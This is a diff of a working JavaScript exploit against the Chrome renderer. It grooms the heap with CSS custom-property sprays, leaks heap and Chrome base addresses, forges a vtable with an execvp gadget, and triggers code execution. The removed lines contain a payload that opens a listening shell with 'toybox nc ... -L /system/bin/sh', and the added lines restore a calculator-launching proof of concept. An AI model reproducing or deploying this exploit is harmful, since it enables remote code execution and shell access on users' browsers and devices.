@@ -584,12 +584,12 @@ function bigintToAscii64(value) {
       //    set $attacker_address=(unsigned long long)points
       //    set $victim_address=$attacker_address+0x10
       //
-    
+
       // debug
       // bp5: after the memory corrpution and font rendering
       // check $victim_address.ref_count should be 2 
       // let bp5 = new ArrayBuffer(0x600);
-    
+
       // avoid victim_address from being allocated, this will work as a cuscino
       // also don't touch div0 since even if we touch a not-corrupted chunk, sometimes
       // css token parsing touches it anyways,
@@ -602,16 +602,16 @@ function bigintToAscii64(value) {
         rs1.getPropertyValue(`--sprayPINO_again${i}`)
         div1.style.removeProperty(`--sprayPINO_again${i}`);
       }
-    
+
       gc(); gc(); gc();
       await sleep(2500);
-    
+
       // debug
       // bp5_2:
       // in theory now we should have the victim object on the thread bucket
       // or on the partitionbucket (most likely this one)
       let bp5_2 = new ArrayBuffer(0x600);
-    
+
       // 7/10 it works, but maybe more
       let retry = 3;
       let pino2_spray_size = 300;
@@ -623,54 +623,62 @@ function bigintToAscii64(value) {
         // here we should add maybe some free so it might be put before the victim object
         gc(); sleep(500);
       }
-    
+
       // debug
       // bp6: after getting back the victim object
       // let bp6 = new ArrayBuffer(0x600);
-    
+
       var check_spray;
       for (let i=0; i<N2; i++) {
           check_spray = rs.getPropertyValue(`--sprayPINO${i}`);     // <--- this could cause an exception
           // we found it
-    
+
           if (check_spray.length > 4) {
             csstarget_pino.push(i);
             csstarget_pino_inv.push(parseInt(check_spray.split("-")[1], 10));
           }
       }
-    
+
       // if we reach here we didn't crash, but it could also mean we didn't find the target
-    
+
       if (check_spray.length > 5) {
         console.log(`We didn't get back the chunk but got a leak ${check_spray.length}`);
-        console.log(`leak: ${check_spray.substring(check_spray.length - 10)}`);
+        console.log(`leak: ${check_spray.substring(result.length - 10)}`);
       }
-    
+
       if (csstarget_pino.length != 3) {
         die("QUIT: one object is missing");
       }
-    
+
+
+      // if we free pino2 spray, and free all except csstarget_pino
+      // then if we lucky we might end up with and empty slot span and so we
+      // can get it back as cssvar but with a different size and use then csstarget_pino to leak
+      //
+      // BUT, for reasons maybe related to optimization, when you touch any property of
+      // a tag, it will also 
+
       console.log(`Victim object referenceable from spray (sprayPINO) object ${csstarget_pino}`)
       console.log(`also referenceable from spray (sprayPINO2) object ${csstarget_pino_inv}`)
-    
+
       // debug
       // bp7: Now we know where the victim object is stored
       // before we start
       let bp7 = new ArrayBuffer(0x600);
-    
+
       // reset cssvar refcounters
       // before moving on, be sure that all ref from spray1 are reset
       gc(); gc();
       await sleep(500);
-    
+
       console.log("ok"); console.log("ok"); // be sure we already invoke console log at least two times
-    
+
       // be sure a new slot_span returns for 0x50 slot_size chunks
       // we changed the barrier from 4k to 50 so care must be done here
-    
+
       let csstarget_pino_inv_max = Math.max(...csstarget_pino_inv);
       let csstarget_pino_inv_min = Math.min(...csstarget_pino_inv);
-    
+
       let from_1 = csstarget_pino_inv_max+1; 
       let to_1 = from_1+40;   // care on this value
       let middle_1 = from_1+10;
@@ -679,7 +687,7 @@ function bigintToAscii64(value) {
         to_1 = (csstarget_pino_inv_min);
         middle_1 = from_1+10;
       }
-    
+
       for (let i=from_1; i<to_1; i++) {
         rs1.getPropertyValue(     `--sprayPINO2${i}`);
         div1.style.removeProperty(`--sprayPINO2${i}`);
@@ -690,7 +698,8 @@ function bigintToAscii64(value) {
           }
         }
       }
-    
+
+
       for (let i=0; i<leak_size_1; i++) {
         // avoid slot span to be put on the free ring so let's keep one object alive per slot span
         // the thing that happen when 'marked_full=1' and 'num_allocation=0' on slowpath free
@@ -701,7 +710,7 @@ function bigintToAscii64(value) {
           }
         }
       }
-    
+
       for (let i=0; i<38; i++) {
           div1.style.setProperty(`--pre_barrier${i}`, barrierString0x200_2);
           if (i % free_at) {
@@ -709,29 +718,29 @@ function bigintToAscii64(value) {
             div1.style.removeProperty(`--pre_barrier${i}`);
           }
       }
-    
+
       var leaks = [];
       var leaks_bytes = [];
       var leaks_addresses = [];
-    
+
       gc(); gc();
       await sleep(500);
-    
+
       // 7/10 it works but maybe more
       // tested many times and this seems to work, 300 (+something) is the right number
       for (let i=N1_plural_rules; i<N2_plural_rules+80; i++) {
         plural_rules[i] = new Intl.PluralRules("en-US");  
       }
-    
+
       // Get leak:
       let bp8 = new ArrayBuffer(0x600);
-    
+
       for (let i=0; i<csstarget_pino.length; i++) {
         let leak = rs.getPropertyValue(`--sprayPINO${csstarget_pino[i]}`);
         // if the object was not freed, or allocated to a different object, etc., just try to get the leak
         if ( (leak.length) < 0x8 )
           die(`A invalid chunk returned on spray ${csstarget_pino[i]}`);
-    
+
         let leak_bytes = new Uint8Array(utf16LeBytes(leak));
         let leak_addresses = get_pointer_all(leak_bytes);
         leaks.push(leak);
@@ -739,43 +748,47 @@ function bigintToAscii64(value) {
         leaks_addresses.push(leak_addresses);
       }
       
+      // console.log("Bene!");
+
       var first_obj;
       var second_obj;
       var third_obj;
       var good_candidate_at = -1;
-    
+
       for (let i=0; i<leaks_addresses.length; i++) {
         first_obj = i;
         let l1 = leaks_addresses[i][2];
         let l2 = leaks_addresses[i][4];
         let good_candidate = true;
-    
+
         for (let j=(i+1) % leaks_addresses.length; j!=i && good_candidate; j = (j+1) % leaks_addresses.length) {
           let c1 = leaks_addresses[j][0] == l1;
           let c2 = leaks_addresses[j][0] == l2;
-    
+
           if (c1) {
             second_obj = j;
+
           } else if (c2){
             third_obj = j;
+
           } else {
             good_candidate = false;
           }
         }
-    
+
         if (good_candidate)
           break;
       }
-    
+
       if ((first_obj == second_obj) || (first_obj == third_obj) || (second_obj == third_obj))
         die("This should not happen");
-    
+
       console.log(`chunk's order (in memory): ${csstarget_pino[first_obj]}, ${csstarget_pino[second_obj]}, ${csstarget_pino[third_obj]}`);
-    
+
       var superPageLeak;
       var superPageLeak2 = (leaks_addresses[first_obj][1] >> 4n) << 4n;
       var superPageLeak3 = (leaks_addresses[first_obj][3] >> 4n) << 4n;
-    
+
       if (superPageLeak2) {
         if (!(superPageLeak2 % 0x200n)) {
           good_candidate_at = second_obj;
@@ -788,47 +801,47 @@ function bigintToAscii64(value) {
           superPageLeak = superPageLeak3;
         }
       }
-    
+
       if (good_candidate_at < 0) {
         die("Didn't found any good object (it should not happen but it could). Only leak is available");
       }
-    
+
       console.log(`Found good candidate 0x${superPageLeak.toString(16)}`);
-    
+
       // console.log( plural_rules[0].select(0)); // "other"
       // bp9
       let bp9 = new ArrayBuffer(0x600);
-    
+
       var superPageBase = get_super_page(superPageLeak);
       var superPageMap = get_super_page_map(superPageBase);
-    
+
       var pa_pp_index = get_partition_page_index(superPageLeak);
       var last_slot = get_last_slot(superPageBase, pa_pp_index, 0x200n);
       var fake_vtab = last_slot + 0x200n;
       var increase_refcount_to = fake_vtab - superPageLeak;
-    
+
       console.log(`Super page leak: 0x${superPageLeak.toString(16)}`);
       console.log(`Super page base: 0x${superPageBase.toString(16)}`);
       console.log(`Super page mapping (probably) starts from: 0x${superPageMap.toString(16)}`);
       console.log(`Fake vtab address: 0x${fake_vtab.toString(16)} (it should contain the string 'UUUU..'`);
-    
+
       var leak_pointers = [];
       let leak = leaks[third_obj];
       let leak_bytes = leaks_bytes[third_obj];
       let leak_addresses = leaks_addresses[third_obj];
-    
+
       if (leak.length < (leaks[second_obj].length-0x10)) {
         leak = leaks[second_obj];
         leak_bytes = leaks_bytes[second_obj];
         leak_addresses = leaks_addresses[second_obj];
       }
-    
+
       if (leak.length < (leaks[first_obj].length-0x20)) {
         leak = leaks[first_obj];
         leak_bytes = leaks_bytes[first_obj];
         leak_addresses = leaks_addresses[first_obj];
       }
-    
+
       let barrier_pattern = "\x02\x00\x00\x00\xcc\x01\x80\x0044444444";
       if (leak.indexOf(barrier_pattern) > 0) {
         leak_pointers = extract_chromebase_from_leak(leak_addresses, check_vtab, superPageMap);
@@ -837,12 +850,12 @@ function bigintToAscii64(value) {
       if (!leak_pointers.length) {
         leak_pointers = extract_chromebase_from_leak(leak_addresses, check_offsets, superPageMap);
       }
-    
+
       if (!leak_pointers.length) {
         console.log(hexdump(leak_bytes));
         die("Sorry the leak does not show any valuable information");
       }
-    
+
       chromeBase = leak_pointers[0];
       writelistener_ = chromeBase + kWriteListenerOffset;
       system_gadget_ = chromeBase + kExecvpGadgetOffset;
@@ -851,121 +864,81 @@ function bigintToAscii64(value) {
         (system_gadget_ & 0xfffn) == (kExecvpGadgetOffset & 0xfffn)) ) {
         die(`[X] Chrome base is not correct: 0x${chromeBase.toString(16)}  ..quit`);
       }
-    
+
       console.log(`Chrome base: 0x${chromeBase.toString(16)}`);
       console.log(`WriteListener callback: 0x${writelistener_.toString(16)}`);
       console.log(`System gadget: 0x${system_gadget_.toString(16)}`);
-    
+
       // bp
       let bp10 = new ArrayBuffer(0x600);
-    
+
       var fake_vtab_ptr = fake_vtab+0x30n;
-      
-      // MODIFIED: Replace xcalc with toybox string
-      var toybox_ascii = 0x786f62796f74n; // "toybox" in little-endian
-    
+      var xcalc_ascii = 0x636c616378n - 1n;
+
       let ab = new ArrayBuffer(0x600);
+
       let view = new DataView(ab);
-      
-      // Initialize with zeros instead of 0x42 for cleaner memory
       for (let i = 0; i < view.byteLength; i++)
-        view.setUint8(i, 0x00);
-    
-      // Set up the fake vtable structure
+        view.setUint8(i, 0x42);
+
       view.setBigUint64(0x10, fake_vtab_ptr, true);
       view.setBigUint64(0x20, fake_vtab_ptr, true);
-      
-      // MODIFIED: Use toybox string instead of xcalc
-      view.setBigUint64(0x30, toybox_ascii, true); // "toybox" string
-      
+      view.setBigUint64(0x30, xcalc_ascii, true);
       view.setBigUint64(0x38, system_gadget_, true);
       view.setBigUint64(0x50, writelistener_, true);
       view.setBigUint64(0x80, 0n, true);
-    
-      // MODIFIED: Build the full netcat command arguments
-      const args = [
-        "toybox\x00",
-        "nc\x00", 
-        "-s\x00",
-        "127.0.0.1\x00",
-        "-p\x00",
-        "1234\x00",
-        "-L\x00",
-        "/system/bin/sh\x00",
-        null  // Terminating null
-      ];
-    
-      // Write strings to memory starting at offset 0x100
-      let currentOffset = 0x100;
-      let argPointers = [];
-      
-      for (let i = 0; i < args.length; i++) {
-        if (args[i] !== null) {
-          argPointers.push(fake_vtab + BigInt(currentOffset));
-          for (let j = 0; j < args[i].length; j++) {
-            view.setUint8(currentOffset + j, args[i].charCodeAt(j));
-          }
-          currentOffset += args[i].length;
-        } else {
-          argPointers.push(0n); // Null terminator
-        }
-      }
-    
-      // Write the argument pointers array at offset 0x60
-      for (let i = 0; i < argPointers.length; i++) {
-        view.setBigUint64(0x60 + i * 8, argPointers[i], true);
-      }
-    
-      // Set the argument array pointer for execvp (should point to the array of pointers)
-      view.setBigUint64(0x40, fake_vtab + 0x60n, true);
-    
+      // view.setBigUint64(0x90, 1, true);
       view.setBigUint64(0xb8, 0n, true);
       view.setBigUint64(0xc8, 0n, true);
       view.setBigUint64(0xd8, 0n, true);
       view.setBigUint64(0xf0, 1n, true);
-    
+      view.setBigUint64(0x100, 0x3132333434333231n, true);
+      view.setBigUint64(0x1e0, 0n, true);
+
       await initAudioContext((leak_size_1+3)*4);
-    
+
       for (let i=0; i<leak_size_1+1; i++) {
         for (let j=i*4; j<(i+1)*4; j++) {
           rs1.getPropertyValue(`--leak_2${j}`)
           div1.style.removeProperty(`--leak_2${j}`)
         }
       }
-    
+
       gc(); gc(); await sleep(500);
-    
+
       // bp
       let bp11 = new ArrayBuffer(0x600);
-    
+
       console.log("doing the delaynode")
       await initDelayNodes(0x2000);
       console.log("done the delaynode")
-    
+ 
       console.log("before allocAudioArray");
       await allocAudioArray(ab);
       console.log("After allocAudioArray");
-    
+
       // bp
       let bp12 = new ArrayBuffer(0x600);
-    
+
       // reset refcounter
       gc(); await sleep(500);
-    
+
       // bp
       let bp13 = new ArrayBuffer(0x600);
-    
+
+
       for (let i=0; i<increase_refcount_to; i++) {
         rs.getPropertyValue(`--sprayPINO${csstarget_pino[good_candidate_at]}`);
       }
-    
+
       // bp
       let bp14 = new ArrayBuffer(0x600);
-    
-      // RCE or Crash - This will execute: toybox nc -s 127.0.0.1 -p 1234 -L /system/bin/sh
+
+      // RCE or Crash
       for (let i=N1_plural_rules; i<N2_plural_rules+80; i++) {
         plural_rules[i].select(0);
       }
+
     }
 
     </script> 
